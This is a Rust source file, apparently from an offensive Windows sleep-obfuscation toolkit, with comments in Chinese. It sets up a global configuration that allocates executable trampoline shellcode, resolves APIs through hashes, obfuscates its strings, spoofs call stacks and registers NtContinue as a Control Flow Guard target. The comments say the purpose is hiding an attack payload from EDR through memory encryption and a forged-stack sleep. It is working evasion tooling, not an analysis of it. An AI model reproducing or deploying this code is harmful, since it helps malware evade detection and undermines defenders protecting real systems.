use alloc::string::String;
use core::ptr::null_mut;

use obfstr::{obfstring as s};
use anyhow::{Result, bail};
use dinvk::hash::{jenkins3, murmur3};
use dinvk::winapis::{NtCurrentProcess, NT_SUCCESS};
use dinvk::module::{
    get_module_address, 
    get_proc_address, 
    get_ntdll_address
};

use crate::types::*;
use crate::{
    cfg::{is_cfg_enforced, register_cfg_targets},
    spoof::StackSpoof,
    winapis::*
};

/// Global configuration object.
static CONFIG: spin::Once<Config> = spin::Once::new();

/// Lazily initializes and returns a singleton [`Config`] instance.
#[inline]
pub fn init_config() -> Result<&'static Config> {
    CONFIG.try_call_once(Config::new)
}

/// Stores resolved DLL base addresses and function pointers.
/// 
/// 在 Config 中，利用硬编码机器码 gadget_rbp (mov rsp, rbp; ret)作为栈指针重定位（Stack Pivot）指令，实现从伪造栈切回真实执行流,并确保cpu精确跳转到预设返回地址.切入伪造堆栈的是NtContinue
/// 
/// 通过 trampoline汇编桥接校准线程池 RDX 到 RCX 的参数约定冲突，并结合通过 PEB动态解析出的系统调用号与 API 静态地址构建底层原语仓库。此外，Config 在初始化阶段会执行 CFG (Control Flow Guard) 目标注册，将 NtContinue等关键跳转点“洗白”进系统白名单以规避内核拦截。最终，Config作为全局单例化的隐匿执行环境被封装，用于驱动针对指定攻击载荷（base 和 size 表示）的混淆状态机，在 time事件触发后完成“权限切换-内存加密-伪造栈休眠-还原回归”的闭环隐匿流程
#[derive(Default, Debug, Clone, Copy)]
pub struct Config {
    pub stack: StackSpoof,
    // 触发NtContinue的rx内存地址.负责按照伪造好的context逻辑跑下去
    pub callback: u64,
    // 执行RtlCaptureContext的rx内存地址.在混淆链启动获取快照时被调用
    pub trampoline: u64,
    // 以下字段在config::new中初始化
    pub modules: Modules,
    pub wait_for_single: WinApi,
    pub base_thread: WinApi,
    pub enum_date: WinApi,
    pub system_function040: WinApi,
    pub system_function041: WinApi,
    pub nt_continue: WinApi,
    pub nt_set_event: WinApi,
    pub rtl_user_thread: WinApi,
    pub nt_protect_virtual_memory: WinApi,
    pub rtl_exit_user_thread: WinApi,
    pub nt_get_context_thread: WinApi,
    pub nt_set_context_thread: WinApi,
    pub nt_test_alert: WinApi,
    pub nt_wait_for_single: WinApi,
    pub rtl_acquire_lock: WinApi,
    pub tp_release_cleanup: WinApi,
    pub rtl_capture_context: WinApi,
    pub zw_wait_for_worker: WinApi,
}

impl Config {
    /// Create a new `Config`.
    /// 
    /// Rust中不允许未初始化的结构体字段,即使该结构体#[derive(Default)].
    pub fn new() -> Result<Self> {
        // Resolve hashed function addresses for all required APIs
        let mut cfg = Self::winapis(Self::modules());
        // 初始化config中需要在运行时计算的字段
        cfg.stack = StackSpoof::new(&cfg)?;
        cfg.callback = Self::alloc_callback()?;
        cfg.trampoline = Self::alloc_trampoline()?;

        // Register Control Flow Guard function targets if enabled
        if let Ok(true) = is_cfg_enforced() {
            register_cfg_targets(&cfg);
        }

        Ok(cfg)
    }

    /// Allocates a small executable memory region used as a trampoline in thread pool callbacks.
    pub fn alloc_callback() -> Result<u64> {
        // Trampoline shellcode
        // hypnus使用线程池触发混淆链,系统调用回调函数时,会将用户自定的参数(这里的context)放在rdx寄存器中.而调用的NtContinue需要的context放入rcx寄存器.是一种windows abi形式
        // 
        let callback = &[
            // 此时rdx存放的是TpAllocTimer(hypnus.rs的timer函数中)传入的context,即伪造的context结构体.该句执行后,rcx就指向这个context,rcx符合NtContinue的第一个参数要求
            0x48, 0x89, 0xD1,       // mov rcx,rdx
            // hypnus在初始化context时,将ntdll!NtContinue真实内存地址放入rax?
            0x48, 0x8B, 0x41, 0x78, // mov rax,QWORD PTR [rcx+0x78] (CONTEXT.RAX)
            // rip=rax,避免操作栈.直接切入了NtContinue.在edr视角,os线程池直接调用NtContinue
            0xFF, 0xE0,             // jmp rax
        ];

        // Allocate RW memory for trampoline
        let mut size = callback.len();
        let mut addr = null_mut();
        // Windows Native API如NtAllocateVirtualMemory其返回值类型是NTSTATUS(对应rust i32)
        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(), 
            &mut addr, 
            0, 
            &mut size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        )) {
            bail!(s!("failed to allocate stack memory"));
        }

        // Write trampoline bytes to allocated memory
        unsafe { core::ptr::copy_nonoverlapping(callback.as_ptr(), addr as *mut u8, callback.len()) };

        // Change protection to RX for execution
        // 现代os中有一个原则,一块内存不能同时write和execute.因此需要先rw后rx
        let mut old_protect = 0;
        if !NT_SUCCESS(NtProtectVirtualMemory(
            NtCurrentProcess(), 
            &mut addr, 
            &mut size, 
            PAGE_EXECUTE_READ as u32, 
            &mut old_protect
        )) {
            bail!(s!("failed to change memory protection for RX"));
        }

        // Locks the specified region of virtual memory into physical memory,
        // preventing it from being paged to disk by the memory manager
        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
        Ok(addr as u64)
    }

    /// Allocates trampoline memory for the execution of `RtlCaptureContext`
    pub fn alloc_trampoline() -> Result<u64> {
        // Trampoline shellcode
        let trampoline = &[
            0x48, 0x89, 0xD1, // mov rcx,rdx
            0x48, 0x31, 0xD2, // xor rdx,rdx
            0xFF, 0x21,       // jmp QWORD PTR [rcx]
        ];

        // Allocate RW memory for trampoline
        let mut size = trampoline.len();
        let mut addr = null_mut();
        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(), 
            &mut addr, 
            0, 
            &mut size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        )) {
            bail!(s!("failed to allocate stack memory"));
        }

        // Write trampoline bytes to allocated memory
        unsafe { core::ptr::copy_nonoverlapping(trampoline.as_ptr(), addr as *mut u8, trampoline.len()) };

        // Change protection to RX for execution
        let mut old_protect = 0;
        if !NT_SUCCESS(NtProtectVirtualMemory(
            NtCurrentProcess(), 
            &mut addr, 
            &mut size, 
            PAGE_EXECUTE_READ as u32, 
            &mut old_protect
        )) {
            bail!(s!("failed to change memory protection for RX"));
        }

        // Locks the specified region of virtual memory into physical memory,
        // preventing it from being paged to disk by the memory manager
        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
        Ok(addr as u64)
    }

    /// Resolves the base addresses of key Windows modules (`ntdll.dll`, `kernel32.dll`, etc).
    fn modules() -> Modules {
        // Load essential DLLs
        let ntdll = get_ntdll_address();
        let kernel32 = get_module_address(2808682670u32, Some(murmur3));
        let kernelbase = get_module_address(2737729883u32, Some(murmur3));
        let load_library = get_proc_address(kernel32, 4066094997u32, Some(murmur3));
        let cryptbase = {
            let mut addr = get_module_address(3312853920u32, Some(murmur3));
            if addr.is_null() {
                addr = uwd::spoof!(load_library, obfstr::obfcstr!(c"CryptBase").as_ptr())
                    .expect(obfstr::obfstr!("Error"))
            }

            addr
        };

        Modules {
            ntdll: Dll::from(ntdll),
            kernel32: Dll::from(kernel32),
            cryptbase: Dll::from(cryptbase),
            kernelbase: Dll::from(kernelbase),
        }
    }

    /// Resolves hashed API winapis addresses.
    fn winapis(modules: Modules) -> Self {
        let ntdll = modules.ntdll.as_ptr();
        let kernel32 = modules.kernel32.as_ptr();
        let cryptbase = modules.cryptbase.as_ptr();

        Self {
            modules,
            wait_for_single: get_proc_address(kernel32, 4186526855u32, Some(jenkins3)).into(),
            base_thread: get_proc_address(kernel32, 4083630997u32, Some(murmur3)).into(),
            enum_date: get_proc_address(kernel32, 695401002u32, Some(jenkins3)).into(),
            system_function040: get_proc_address(cryptbase, 1777190324, Some(murmur3)).into(),
            system_function041: get_proc_address(cryptbase, 587184221, Some(murmur3)).into(),
            nt_continue: get_proc_address(ntdll, 3396789853u32, Some(jenkins3)).into(),
            rtl_capture_context: get_proc_address(ntdll, 1384243883u32, Some(jenkins3)).into(),
            nt_set_event: get_proc_address(ntdll, 1943906260, Some(jenkins3)).into(),
            rtl_user_thread: get_proc_address(ntdll, 1578834099, Some(murmur3)).into(),
            nt_protect_virtual_memory: get_proc_address(ntdll, 581945446, Some(jenkins3)).into(),
            rtl_exit_user_thread: get_proc_address(ntdll, 1518183789, Some(jenkins3)).into(),
            nt_set_context_thread: get_proc_address(ntdll, 3400324539u32, Some(jenkins3)).into(),
            nt_get_context_thread: get_proc_address(ntdll, 437715432, Some(jenkins3)).into(),
            nt_test_alert: get_proc_address(ntdll, 2960797277u32, Some(murmur3)).into(),
            nt_wait_for_single: get_proc_address(ntdll, 2606513692u32, Some(jenkins3)).into(),
            rtl_acquire_lock: get_proc_address(ntdll, 160950224u32, Some(jenkins3)).into(),
            tp_release_cleanup: get_proc_address(ntdll, 2871468632u32, Some(jenkins3)).into(),
            zw_wait_for_worker: get_proc_address(ntdll, 2326337356u32, Some(jenkins3)).into(),
            // 结构体更新语法（Struct Update Syntax）
            // 为结构体中所有未被显式赋值的字段生成一个“默认值”(空/零地址)
            // 风险:不会检查结构体字段是否被遗漏;如果运行时使用这个default的零/空地址调用函数,程序会crash(非法内存访问).这显然是运行时crash的温床,不要试图通过注释/记忆消除此风险,而是
            // 1.使用option/result wrap每个字段 2. 在config::new后面加一个对config的verify()方法用以检测是否完整解析环境
            ..Default::default()
        }
    }
}

/// Get current stack pointer
#[inline]
pub fn current_rsp() -> u64 {
    
    let rsp: u64;
    // {}对应后面变量
    // out:输出参数;reg:任意空闲通用寄存器作为中转;rsp:将中转寄存器里面的值给上面定义的rsp变量
    unsafe { core::arch::asm!("mov {}, rsp", out(reg) rsp) };
    rsp
}
